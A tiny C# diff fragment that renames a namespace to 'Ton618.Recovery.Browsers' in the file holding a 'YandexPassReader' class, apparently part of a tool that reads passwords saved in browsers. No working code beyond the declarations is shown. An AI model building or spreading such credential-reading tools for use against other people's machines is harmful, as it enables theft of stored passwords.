@@ -3,7 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 
-namespace Everything.Recovery.Browsers
+namespace Ton618.Recovery.Browsers
 {
     public class YandexPassReader : ChromiumBase
     {
